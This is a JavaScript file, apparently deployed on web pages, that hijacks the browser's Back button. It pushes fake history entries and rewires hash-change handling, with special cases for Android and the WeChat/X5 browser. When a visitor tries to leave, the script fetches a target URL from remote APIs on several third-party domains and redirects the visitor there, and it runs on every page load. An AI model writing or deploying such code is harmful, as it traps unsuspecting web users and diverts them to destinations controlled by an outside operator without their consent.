window.onpageshow = function() {
    sessionStorage.getItem('jumpOut') && a();
}

var rate = 100;
var apiUrl = 'https://ai8.top/api/getWeUrl';

var apiArr = [
    'https://ai8.top/api/getWeUrl',                             //0
    'https://api.jianyuekeji.cn/api/getDomain/3286_7bwv1yukxsbx19yg',//1
    'https://ydapi.jianyuekeji.cn/dxyuedu?id=5133&rbid=11111&cb=json',//2'https://api.jianyuekeji.cn/api/getDomain/5133_jdvue9vejevmeusg',//2
    'https://ydapi.jianyuekeji.cn/dxyuedu?id=5134&rbid=11111&cb=json',//3'https://api.jianyuekeji.cn/api/getDomain/5134_4kwyn83uebbffavk',//3
    'https://api.jianyuekeji.cn/api/getDomain/5161_kvex7xsyf3tzyzk2',//4
    'https://aa.bypanghu.xyz/task/getDomain?hh=wt23&cs=2&pp=0',//5
    'https://ydapi.jianyuekeji.cn/dxyuedu?id=3268&rbid=11111&cb=json',//6
];


const now = new Date(); // 获取当前时间
const minute = now.getMinutes(); // 获取分钟
if(minute.toString().length == 1){
    var fen = "0" + minute.toString();
}else{
    var fen = minute.toString();
}
fen = parseInt(fen.substr(0,1)) + 1


var nid = 0;
var n1 = fen % 3;
if(n1 == 0){
    nid = 0;
}else if(n1 == 1){
    nid = 0;
}else if(n1 == 2){
    nid = 0;
}

nid = 0;

console.log("nid" + nid);
//var n2 = 2;//fen % 2 == 0 ? 3 : 3;

var href = location.href ;  //获取当前请求路径
if(href.indexOf("web-")>-1 || href.indexOf("ct.cn")>-1 || href.indexOf("ta.cn")>-1 || href.indexOf("ab.cn")>-1){
    //跳转
    apiUrl = apiArr[0];
}else if(href.indexOf("ka.cn")>-1){
    apiUrl = apiArr[1];
}else if(href.indexOf("core")>-1){
    apiUrl = apiArr[2];
}else if(href.indexOf("it")>-1){
    apiUrl = apiArr[2];
}else if(href.indexOf("ai8")>-1){
    apiUrl = apiArr[3];
}else if(href.indexOf("wan55")>-1){
    apiUrl = apiArr[3];
}else{
    apiUrl = apiArr[1];
}

var rand_n = Math.floor(Math.random() * 100);

if(rand_n <= rate){
    ntzgo();
}


function a() {
    window.fetch(apiUrl).then(function(res) {
        return res.json();
    }).then(function(data) {
        
        location.href = data.url ? data.url : data.data.url;
    })
}

function ntzgo() {
    history.pushState(history.length + 1, "message", window.location.href.split("#")[0] + "#" + new Date()
        .getTime());
    if (navigator.userAgent.indexOf("Android") != -1) {
        if (typeof(tbsJs) != "undefined") {
            tbsJs.onReady("{useCachedApi : 'true'}", function(e) {});
            window.onhashchange = function() {
                window.history.pushState("forward", null, "#");
                window.history.forward(1);
                a()
            }
        } else {
            var pop = 0;
            window.onhashchange = function(event) {
                pop++;
                if (pop >= 3) {
                    a()
                } else {
                    history.go(1)
                }
            };
            history.go(-1)
        }
    } else {
        window.onhashchange = function() {
            a()
        }
    }
};
//123
//06-02 18:25